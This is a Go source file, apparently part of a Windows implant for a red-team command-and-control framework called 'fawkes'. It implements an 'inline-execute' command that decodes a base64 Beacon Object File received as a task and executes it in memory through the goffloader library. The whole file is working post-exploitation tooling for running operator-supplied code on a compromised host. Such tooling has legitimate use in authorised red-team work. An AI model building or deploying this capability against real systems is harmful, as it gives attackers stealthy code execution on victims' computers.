//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
)

// InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
type InlineExecuteCommand struct{}

// Name returns the command name
func (c *InlineExecuteCommand) Name() string {
	return "inline-execute"
}

// Description returns the command description
func (c *InlineExecuteCommand) Description() string {
	return "Execute a Beacon Object File (BOF/COFF) in memory"
}

// InlineExecuteParams represents the parameters for inline-execute
type InlineExecuteParams struct {
	BOFB64     string   `json:"bof_b64"`     // Base64-encoded BOF bytes
	EntryPoint string   `json:"entry_point"` // Entry point function name
	Arguments  []string `json:"arguments"`   // Goffloader format arguments (e.g., ["zbing.com", "i80"])
}

// Execute executes the inline-execute command
func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
	// Add panic recovery to catch crashes
	defer func() {
		if r := recover(); r != nil {
			// Panic occurred - log it
			fmt.Printf("PANIC RECOVERED in inline-execute: %v\n", r)
		}
	}()

	// Parse parameters
	var params InlineExecuteParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v\nRaw params: %s", err, task.Params),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate BOF data
	if params.BOFB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No BOF data provided",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(params.BOFB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding BOF data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(bofBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: BOF data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Debug: Show what we received
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] BOF size: %d bytes\n", len(bofBytes)))
	output.WriteString(fmt.Sprintf("[*] Entry point: %s\n", params.EntryPoint))
	output.WriteString(fmt.Sprintf("[*] Arguments RAW: %v\n", params.Arguments))
	output.WriteString(fmt.Sprintf("[*] Arguments count: %d\n", len(params.Arguments)))
	for i, arg := range params.Arguments {
		output.WriteString(fmt.Sprintf("[*]   Arg[%d]: %q (len=%d)\n", i, arg, len(arg)))
	}
	output.WriteString("[*] About to pack arguments...\n")

	// Try to pack arguments first to see if that's where it crashes
	packedArgs, err := lighthouse.PackArgs(params.Arguments)
	if err != nil {
		output.WriteString(fmt.Sprintf("\n[!] Error packing arguments: %v\n", err))
		return structs.CommandResult{
			Output:    output.String(),
			Status:    "error",
			Completed: true,
		}
	}
	output.WriteString(fmt.Sprintf("[*] Packed %d bytes of arguments: %x\n", len(packedArgs), packedArgs))
	output.WriteString("[*] About to call coff.LoadWithMethod...\n")

	// Load and execute the BOF
	result, err := executeBOF(bofBytes, params.EntryPoint, params.Arguments)
	if err != nil {
		output.WriteString(fmt.Sprintf("\n[!] Error executing BOF: %v\n", err))
		return structs.CommandResult{
			Output:    output.String(),
			Status:    "error",
			Completed: true,
		}
	}

	output.WriteString("\n[+] BOF execution completed\n")
	if result != "" {
		output.WriteString(fmt.Sprintf("\n--- BOF Output ---\n%s\n", result))
	}

	return structs.CommandResult{
		Output:    output.String(),
		Status:    "success",
		Completed: true,
	}
}

// executeBOF loads and executes a BOF/COFF file using goffloader
func executeBOF(bofBytes []byte, entryPoint string, args []string) (string, error) {
	// Arguments are already packed by the caller
	packedArgs, err := lighthouse.PackArgs(args)
	if err != nil {
		return "", fmt.Errorf("failed to pack arguments: %w", err)
	}

	// Load and execute the BOF using goffloader
	output, err := coff.LoadWithMethod(bofBytes, packedArgs, entryPoint)
	if err != nil {
		return "", fmt.Errorf("failed to execute BOF: %w", err)
	}

	return output, nil
}
